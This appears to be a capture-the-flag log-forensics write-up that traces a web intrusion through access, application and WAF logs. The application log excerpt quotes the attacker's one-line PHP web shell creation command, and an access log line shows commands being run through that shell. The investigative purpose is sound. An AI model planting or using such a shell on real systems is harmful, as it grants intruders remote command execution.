## Overview

In this challenge, we investigated a web-based intrusion involving multiple stages of compromise, including initial probing, web shell deployment, data exfiltration, and persistence mechanisms. The attacker repeatedly left the signature `4A4D` and used a PHP-based web shell to maintain access.

Three logs namely access.log, application.log and waf.log were provided for analysis. The logs, security platform, and threat intel data revealed a targeted campaign against CogWork-1 infrastructure. Below is the detailed breakdown of the questions and findings.

## Q01 ‚Äì What is the first User-Agent used by the attacker?

**Answer**:  
`Lilnunc/4A4D - SpecterEye`

**How it was found**:
We examined the `access.log`. The first log entry contains the request to `/robots.txt` with this User-Agent:
```log
‚ûú  cat access.log | head
2025-05-01 08:23:12 IP_REDACTED - - [01/May/2025:08:23:12 +0000] "GET /robots.txt HTTP/1.1" 200 847 "-" "Lilnunc/4A4D - SpecterEye"
2025-05-01 08:23:45 IP_REDACTED - - [01/May/2025:08:23:45 +0000] "GET /sitemap.xml HTTP/1.1" 200 2341 "-" "Lilnunc/4A4D - SpecterEye"
2025-05-01 08:24:12 IP_REDACTED - - [01/May/2025:08:24:12 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 162 "-" "Lilnunc/4A4D - SpecterEye"
2025-05-01 08:24:23 IP_REDACTED - - [01/May/2025:08:24:23 +0000] "GET /admin HTTP/1.1" 404 162 "-" "Lilnunc/4A4D - SpecterEye"
```

## Q02 ‚Äì What is the file name of the deployed web shell?

**Answer**:  
`temp_4A4D.php`

**Evidence**:

First lets check for any possible web shell entries in waf.log file. Then verify the presence of web shell utility in access.log and application.log.
- Found in `waf.log`, marked as **BYPASS**:  
```
‚ûú  cat waf.log| grep -i shell
2025-05-15 11:25:01 [CRITICAL] waf.exec - IP IP_REDACTED - Rule: WEBSHELL_DEPLOYMENT - Action: BYPASS - Web shell creation detected

```

- Also accessed multiple times in `access.log`:  
```
‚ûú  cat access.log| grep -i 'temp_4A4D'
2025-05-18 15:02:12 IP_REDACTED - - [18/May/2025:15:02:12 +0000] "GET /uploads/temp_4A4D.php?cmd=ls%20-la%20/var/www/html/uploads/ HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"

```

- `application.log`:  
```
‚ûú  cat application.log| grep -i 'temp_4A4D'
2025-05-15 11:25:01 [CRITICAL] webapp.api.v2.debug - Backdoor deployment initiated by IP_REDACTED - command: 'echo "<?php system($_GET[\"cmd\"]); ?>" > /var/www/html/uploads/temp_4A4D.php'
2025-05-15 11:25:12 [CRITICAL] webapp.api.v2.debug - Web shell created at /uploads/temp_4A4D.php by IP_REDACTED
2025-05-18 15:02:12 [CRITICAL] webapp.security - Web shell access detected - temp_4A4D.php executed by IP_REDACTED
```
